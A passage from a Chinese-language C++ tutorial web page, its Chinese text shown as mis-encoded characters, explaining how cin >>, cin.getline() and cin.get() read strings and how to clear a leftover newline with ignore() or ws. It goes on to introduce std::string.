è¯»å–ç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I see you like &quot;</span> &lt;&lt; dessert &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç¤ºä¾‹åŠé—®é¢˜:</strong></p><p>å¦‚æœç”¨æˆ·è¾“å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter your first name: Ada Lovelace</span><br><span class="line">Enter your favorite dessert: Chocolate Cake</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¾“å‡ºå°†ä¼šæ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello, Ada!</span><br><span class="line">I see you like Lovelace. </span><br></pre></td></tr></table></figure><p><strong>åŸå› :</strong></p><ol><li> <code>cin &gt;&gt; name;</code> è¯»å–åˆ° â€œAdaâ€ åé‡åˆ°ç©ºæ ¼åœæ­¢ï¼Œâ€Adaâ€ è¢«å­˜å…¥ <code>name</code> æ•°ç»„ï¼ˆå¹¶è‡ªåŠ¨æ·»åŠ  <code>\0</code>ï¼‰ã€‚</li><li> â€œ Lovelace\nChocolate Cake\nâ€ ä»ç„¶ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚</li><li> <code>cin &gt;&gt; dessert;</code> ä»ç¼“å†²åŒºå¼€å§‹è¯»å–ï¼Œè·³è¿‡å¼€å¤´çš„ç©ºæ ¼ï¼Œè¯»å–åˆ° â€œLovelaceâ€ åé‡åˆ°æ¢è¡Œç¬¦åœæ­¢ï¼Œâ€Lovelaceâ€ è¢«å­˜å…¥ <code>dessert</code> æ•°ç»„ã€‚</li></ol><p>è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ç»“æœã€‚<code>cin &gt;&gt;</code> ä¸é€‚åˆè¯»å–åŒ…å«ç©ºæ ¼çš„å­—ç¬¦ä¸²ã€‚æ­¤å¤–ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„å•è¯é•¿åº¦è¶…è¿‡äº†æ•°ç»„çš„å¤§å°ï¼ˆå‡å» <code>\0</code> çš„ç©ºé—´ï¼‰ï¼Œè¿˜ä¼šå¯¼è‡´**ç¼“å†²åŒºæº¢å‡º (Buffer Overflow)**ï¼Œè¿™æ˜¯ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚</p><h3 id="4-2-4-æ¯æ¬¡è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²è¾“å…¥"><a href="#4-2-4-æ¯æ¬¡è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²è¾“å…¥" class="headerlink" title="4.2.4 æ¯æ¬¡è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²è¾“å…¥"></a>4.2.4 æ¯æ¬¡è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²è¾“å…¥</h3><p>ä¸ºäº†è§£å†³ <code>cin &gt;&gt;</code> çš„é—®é¢˜ï¼Œ<code>iostream</code> åº“æä¾›äº†å…¶ä»–æˆå‘˜å‡½æ•°æ¥è¯»å–æ•´è¡Œè¾“å…¥ï¼ŒåŒ…æ‹¬å…¶ä¸­çš„ç©ºæ ¼ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ä¸ºæ­¢ã€‚å¸¸ç”¨çš„æœ‰ä¸¤ä¸ªï¼š<code>getline()</code> å’Œ <code>get()</code>ã€‚</p><p><strong>1. <code>cin.getline(char* buffer, int size, char delimiter = &#39;\n&#39;)</code></strong></p><ul><li>  <code>buffer</code>: ç”¨äºå­˜å‚¨è¾“å…¥çš„ <code>char</code> æ•°ç»„ã€‚</li><li>  <code>size</code>: ç¼“å†²åŒºçš„å¤§å°ã€‚<code>getline()</code> æœ€å¤šè¯»å– <code>size - 1</code> ä¸ªå­—ç¬¦ï¼Œä»¥ç¡®ä¿æœ‰ç©ºé—´å­˜æ”¾æœ«å°¾çš„ç©ºå­—ç¬¦ <code>\0</code>ã€‚</li><li>  <code>delimiter</code> (å¯é€‰): æŒ‡å®šè¯»å–åœæ­¢çš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ <code>\n</code>ã€‚</li></ul><p><strong>è¡Œä¸º:</strong></p><ul><li>  è¯»å–å­—ç¬¦åˆ° <code>buffer</code> ä¸­ï¼Œç›´åˆ°è¯»å–äº† <code>size - 1</code> ä¸ªå­—ç¬¦ã€é‡åˆ° <code>delimiter</code> æˆ–åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚</li><li>  å¦‚æœé‡åˆ° <code>delimiter</code>ï¼Œå®ƒä¼š<strong>è¯»å–å¹¶ä¸¢å¼ƒ</strong>è¯¥åˆ†éš”ç¬¦ï¼ˆé€šå¸¸æ˜¯æ¢è¡Œç¬¦ï¼‰ã€‚</li><li>  æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ <code>\0</code>ã€‚</li></ul><p><strong>2. <code>cin.get(char* buffer, int size, char delimiter = &#39;\n&#39;)</code></strong></p><ul><li>  å‚æ•°ä¸ <code>getline()</code> ç±»ä¼¼ã€‚</li></ul><p><strong>è¡Œä¸º:</strong></p><ul><li>  è¯»å–å­—ç¬¦åˆ° <code>buffer</code> ä¸­ï¼Œç›´åˆ°è¯»å–äº† <code>size - 1</code> ä¸ªå­—ç¬¦ã€é‡åˆ° <code>delimiter</code> æˆ–åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚</li><li>  ä¸ <code>getline()</code> ä¸åŒçš„æ˜¯ï¼Œå¦‚æœé‡åˆ° <code>delimiter</code>ï¼Œå®ƒ<strong>ä¸ä¼šè¯»å–</strong>è¯¥åˆ†éš”ç¬¦ï¼Œè€Œæ˜¯å°†å…¶<strong>ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­</strong>ã€‚</li><li>  æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ <code>\0</code>ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">char</span> fullName[SIZE];</span><br><span class="line">    <span class="keyword">char</span> address[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ getline()</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(fullName, SIZE); <span class="comment">// è¯»å–æ•´è¡Œï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼Œä¸¢å¼ƒæ¢è¡Œç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your address: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(address, SIZE); <span class="comment">// è¯»å–ä¸‹ä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; fullName &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address: &quot;</span> &lt;&lt; address &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ get() - æ³¨æ„æ¢è¡Œç¬¦é—®é¢˜</span></span><br><span class="line">    <span class="keyword">char</span> title[SIZE];</span><br><span class="line">    <span class="keyword">char</span> author[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter book title: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(title, SIZE); <span class="comment">// è¯»å–æ•´è¡Œï¼Œæ¢è¡Œç¬¦ç•™åœ¨ç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœç›´æ¥è°ƒç”¨ä¸‹ä¸€ä¸ª get()ï¼Œå®ƒä¼šç«‹å³è¯»åˆ°ä¸Šä¸€ä¸ªç•™ä¸‹çš„æ¢è¡Œç¬¦å¹¶åœæ­¢</span></span><br><span class="line">    <span class="comment">// std::cin.get(author, SIZE); // è¿™å°†å¯¼è‡´ author ä¸ºç©º</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éœ€è¦å¤„ç†æ‰ç•™ä¸‹çš„æ¢è¡Œç¬¦</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•ä¸€ï¼šå†è°ƒç”¨ä¸€æ¬¡ get() è¯»å–å•ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="comment">// std::cin.get(); // è¯»å–å¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ–¹æ³•äºŒï¼šä½¿ç”¨ ignore() è·³è¿‡å­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">100</span>, <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// è·³è¿‡æœ€å¤š100ä¸ªå­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ï¼ˆå¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter author name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(author, SIZE); <span class="comment">// ç°åœ¨å¯ä»¥æ­£ç¡®è¯»å–ä½œè€…å</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Title: &quot;</span> &lt;&lt; title &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Author: &quot;</span> &lt;&lt; author &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é€‰æ‹© <code>getline()</code> è¿˜æ˜¯ <code>get()</code>?</strong></p><ul><li>  <code>getline()</code> é€šå¸¸æ›´æ–¹ä¾¿ï¼Œå› ä¸ºå®ƒä¼šè‡ªåŠ¨å¤„ç†æ‰è¡Œå°¾çš„æ¢è¡Œç¬¦ï¼Œä½¿å¾—è¿ç»­è¯»å–å¤šè¡Œè¾“å…¥æ›´ç®€å•ã€‚</li><li>  <code>get()</code> æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶ï¼Œå› ä¸ºå®ƒå…è®¸ä½ æ£€æŸ¥ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯æ¢è¡Œç¬¦ï¼Œä½†éœ€è¦ä½ æ‰‹åŠ¨å¤„ç†ç•™åœ¨ç¼“å†²åŒºçš„åˆ†éš”ç¬¦ã€‚</li></ul><p><strong>ç©ºè¡Œå’Œ <code>getline()</code>:</strong> å¦‚æœ <code>getline()</code> é‡åˆ°ç©ºè¡Œï¼ˆå³ç”¨æˆ·ç›´æ¥æŒ‰ Enterï¼‰ï¼Œå®ƒä¼šè¯»å–è¿™ä¸ªç©ºè¡Œï¼Œå°†ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼ˆåªåŒ…å« <code>\0</code>ï¼‰å­˜å…¥ç¼“å†²åŒºï¼Œå¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ã€‚</p><h3 id="4-2-5-æ··åˆè¾“å…¥å­—ç¬¦ä¸²å’Œæ•°å­—"><a href="#4-2-5-æ··åˆè¾“å…¥å­—ç¬¦ä¸²å’Œæ•°å­—" class="headerlink" title="4.2.5 æ··åˆè¾“å…¥å­—ç¬¦ä¸²å’Œæ•°å­—"></a>4.2.5 æ··åˆè¾“å…¥å­—ç¬¦ä¸²å’Œæ•°å­—</h3><p>å½“ç¨‹åºéœ€è¦äº¤æ›¿è¯»å–æ•°å­—ï¼ˆä½¿ç”¨ <code>cin &gt;&gt;</code>ï¼‰å’Œæ•´è¡Œå­—ç¬¦ä¸²ï¼ˆä½¿ç”¨ <code>cin.getline()</code> æˆ– <code>cin.get()</code>ï¼‰æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼š<code>cin &gt;&gt;</code> è¯»å–æ•°å­—åï¼Œä¼šå°†æ•°å­—åé¢çš„<strong>æ¢è¡Œç¬¦</strong>ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚</p><p>å¦‚æœç´§æ¥ç€è°ƒç”¨ <code>cin.getline()</code> æˆ– <code>cin.get()</code>ï¼Œå®ƒä»¬ä¼šç«‹å³è¯»åˆ°è¿™ä¸ªæ®‹ç•™çš„æ¢è¡Œç¬¦ï¼Œå¹¶è®¤ä¸ºå·²ç»åˆ°è¾¾è¡Œå°¾ï¼Œå¯¼è‡´è¯»å–å¤±è´¥æˆ–è¯»åˆ°ç©ºå­—ç¬¦ä¸²ã€‚</p><p><strong>é—®é¢˜ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; <span class="comment">// è¯»å–å¹´é¾„ï¼Œæ¢è¡Œç¬¦ç•™åœ¨ç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(name, <span class="number">50</span>); <span class="comment">// ç«‹å³è¯»åˆ°æ®‹ç•™çš„æ¢è¡Œç¬¦ï¼Œgetline ç»“æŸï¼Œname ä¸ºç©º</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Name: []</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ³•:</strong></p><p>åœ¨è¯»å–æ•°å­—åã€è°ƒç”¨ <code>getline()</code> æˆ– <code>get()</code> è¯»å–æ•´è¡Œä¹‹å‰ï¼Œéœ€è¦æ¶ˆè€—æ‰è¾“å…¥ç¼“å†²åŒºä¸­æ®‹ç•™çš„æ¢è¡Œç¬¦ã€‚</p><ol><li><strong>ä½¿ç”¨ <code>cin.ignore()</code>:</strong> è¿™æ˜¯å¸¸ç”¨çš„æ–¹æ³•ã€‚<code>cin.ignore(n, delim)</code> ä¼šè·³è¿‡è¾“å…¥æµä¸­çš„å­—ç¬¦ï¼Œç›´åˆ°è·³è¿‡äº† <code>n</code> ä¸ªå­—ç¬¦ï¼Œæˆ–è€…é‡åˆ°äº† <code>delim</code> åˆ†éš”ç¬¦ï¼ˆå¹¶ä¸¢å¼ƒè¯¥åˆ†éš”ç¬¦ï¼‰ï¼Œä»¥å…ˆåˆ°è€…ä¸ºå‡†ã€‚é€šå¸¸ç”¨äºä¸¢å¼ƒæ¢è¡Œç¬¦ï¼š <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">100</span>, <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// è·³è¿‡æœ€å¤š100ä¸ªå­—ç¬¦ï¼Œç›´åˆ°å¹¶åŒ…æ‹¬ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦</span></span><br><span class="line"><span class="comment">// æˆ–è€…æ›´ç®€å•åœ°ï¼Œå¦‚æœç¡®å®šåªæœ‰ä¸€ä¸ªæ¢è¡Œç¬¦éœ€è¦ä¸¢å¼ƒ</span></span><br><span class="line"><span class="comment">// std::cin.ignore(); // è·³è¿‡ä¸‹ä¸€ä¸ªå­—ç¬¦ (å³æ¢è¡Œç¬¦)</span></span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>(cin &gt;&gt; ws)</code>:</strong> C++11 å¼•å…¥äº† <code>std::ws</code> è¾“å…¥æµæ“çºµç¬¦ï¼Œå®ƒå¯ä»¥è¯»å–å¹¶ä¸¢å¼ƒè¾“å…¥æµå¼€å¤´çš„æ‰€æœ‰ç©ºç™½å­—ç¬¦ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="built_in">std</span>::ws).getline(name, <span class="number">50</span>); </span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>cin.get()</code> è¯»å–å•ä¸ªå­—ç¬¦:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>.get(); <span class="comment">// è¯»å–å¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>ä¿®æ­£åçš„ç¤ºä¾‹ (ä½¿ç”¨ <code>cin.ignore()</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // ä¸ºäº† numeric_limits (æ›´å¥å£®çš„ ignore)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…é™¤è¾“å…¥ç¼“å†²åŒºï¼Œç‰¹åˆ«æ˜¯æ¢è¡Œç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line">    <span class="comment">// numeric_limits&lt;streamsize&gt;::max() è·å–æµèƒ½å¤„ç†çš„æœ€å¤§å­—ç¬¦æ•°ï¼Œç¡®ä¿æ¸…é™¤æ•´è¡Œ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(name, <span class="number">50</span>); <span class="comment">// ç°åœ¨å¯ä»¥æ­£ç¡®è¯»å–å§“å</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¿®æ­£åçš„ç¤ºä¾‹ (ä½¿ç”¨ <code>ws</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ios&gt; // ä¸ºäº† ws</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="comment">// åœ¨ getline ä¹‹å‰ä½¿ç”¨ ws è·³è¿‡ç©ºç™½ç¬¦</span></span><br><span class="line">    (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="built_in">std</span>::ws).getline(name, <span class="number">50</span>); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong> æ··åˆè¾“å…¥æ•°å­—å’Œæ•´è¡Œå­—ç¬¦ä¸²æ—¶ï¼ŒåŠ¡å¿…è®°å¾—åœ¨ <code>cin &gt;&gt; number;</code> ä¹‹åã€è°ƒç”¨ <code>getline()</code> æˆ– <code>get()</code> ä¹‹å‰ï¼Œæ¸…é™¤è¾“å…¥ç¼“å†²åŒºä¸­æ®‹ç•™çš„æ¢è¡Œç¬¦ã€‚ä½¿ç”¨ <code>cin.ignore()</code> æˆ– <code>(cin &gt;&gt; ws)</code> æ˜¯æ¨èçš„åšæ³•ã€‚</p><h2 id="4-3-stringç±»ç®€ä»‹"><a href="#4-3-stringç±»ç®€ä»‹" class="headerlink" title="4.3 stringç±»ç®€ä»‹"></a>4.3 stringç±»ç®€ä»‹</h2><p>è™½ç„¶ C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰åœ¨ C++ ä¸­ä»ç„¶å¯ç”¨ï¼Œä½† C++ æ ‡å‡†åº“æä¾›äº†ä¸€ä¸ªæ›´å¼ºå¤§ã€æ›´æ–¹ä¾¿ã€æ›´å®‰å…¨çš„æ›¿ä»£å“ï¼š<code>std::string</code> ç±»ã€‚</p><p><code>string</code> ç±»æ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå°è£…äº†å­—ç¬¦åºåˆ—çš„æ“ä½œï¼Œæä¾›äº†è‡ªåŠ¨å†…å­˜ç®¡ç†å’Œä¸°å¯Œçš„æˆå‘˜å‡½æ•°æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨ <code>string</code> ç±»ï¼Œéœ€è¦åŒ…å« <code>&lt;string&gt;</code> å¤´æ–‡ä»¶ã€‚</p><p><strong>åŸºæœ¬æ¦‚å¿µ:</strong></p><ul><li>  <strong>å¯¹è±¡:</strong> <code>string</code> ç±»å‹çš„å˜é‡æ˜¯**å¯¹è±¡ (Object)**ã€‚å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ã€‚</li><li>  <strong>è‡ªåŠ¨å†…å­˜ç®¡ç†:</strong> ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼ˆç¡®ä¿æ•°ç»„è¶³å¤Ÿå¤§ï¼Œå¤„ç†ç©ºå­—ç¬¦ï¼‰çš„ C é£æ ¼å­—ç¬¦ä¸²ä¸åŒï¼Œ<code>string</code> 